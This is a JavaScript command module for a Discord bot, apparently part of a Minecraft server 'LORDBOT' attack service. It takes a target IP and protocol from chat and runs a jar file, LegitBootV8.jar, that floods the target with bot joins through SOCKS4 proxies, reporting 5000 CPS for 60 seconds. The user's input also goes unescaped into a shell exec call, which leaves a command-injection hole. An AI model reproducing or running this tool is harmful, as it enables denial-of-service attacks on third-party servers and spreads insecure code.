const Discord = require("discord.js");
const disbut = require('discord.js-buttons')

exports.run = async (client, message, args) => {
const host = message.content.split (" ")[1]
const protocol = message.content.split (" ")[2]
const methods = message.content.split (" ")[3]
const prefix = message.content.split (" ")[4]
const chatbot = args.slice(4).join(" ");
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;
var version = ayarlar.versionbot;
var img = ayarlar.img;
var photo = ayarlar.photo;
var rolebasic = ayarlar.rolebasic;
const BannedWords = ["mc2lord.net", "103.74.120.226"]

if (message.channel.id != room) {
	return;
  }
  
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('UYARMAK')
	.setDescription("`Saldırı komutu .attack 1.1.1.1 47 botjoiner`")
	message.channel.send(embed1);
	message.react('❌');
	return;
}

if(!args[1]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('UYARMAK')
	.setDescription("`BOT sürümünün yazılması için onay gerekir.`")
	message.channel.send(embed1);
	message.react('❌');
	return;
}

if(!args[2]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('UYARMAK')
	.setDescription("`Lütfen Saldırı yöntemini girin`")
	message.channel.send(embed1);
	message.react('❌');
	return;
}
  
if(args[2] === "Join" || args[2] === "join") {

		if (BannedWords.some(word => message.toString().toLowerCase().includes(word))) {
			message.delete().catch(e => console.error("Mesaj silinemez."));
			message.reply(`Sunucu yasaklanmıştır.`)
			return;
		}   
		var exec = require('child_process').exec
			exec(`java -jar LegitBootV8.jar ${host}:${protocol} 2 10 47 120 proxy.txt socks4`, (error, stdout, stderr) => {
		});

	console.log('Saldırı başladığı oda ID Discord:' +  message.guild.id)

	let stop = new disbut.MessageButton()
		.setStyle('red')
		.setLabel("DỪNG LẠI")
		.setID('stop')

	const embed = new Discord.MessageEmbed()
		.setColor('RANDOM')
		.setTitle(version)
		.setDescription("**IP**: " + host + " \n **Protocol**: " + protocol + "\n \n **Method**: Join \n \n **CPS**: 5000 \n **Time**: 60s")
		.setFooter('© » LORDBOT 2022-2023', img)
		.setImage(photo)
	const countdownEmbed = new Discord.MessageEmbed()
		.setColor('RANDOM')
		.setTitle(version)
		.setDescription("KONTROL EDİLİYO...")
		.setImage("https://i.gifer.com/FRKK.gif")
		.setFooter('© » LORDBOT 2022-2023', img)
	message.channel.send({ embed: countdownEmbed }).then((msg) => {
			setTimeout(function () {
				msg.edit(embed);
				message.react('✅');
			}, 3000)
		})
	} else {
	 message.reply("Saldırı Yöntemi mevcut değil.");
	 message.react('❌');
	 return;
	}
}


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['as'],
  permLevel: 0
}

exports.help = {
  name: 'as',
  description: 'Lệnh Tấn Công',
  usage: 'as'
}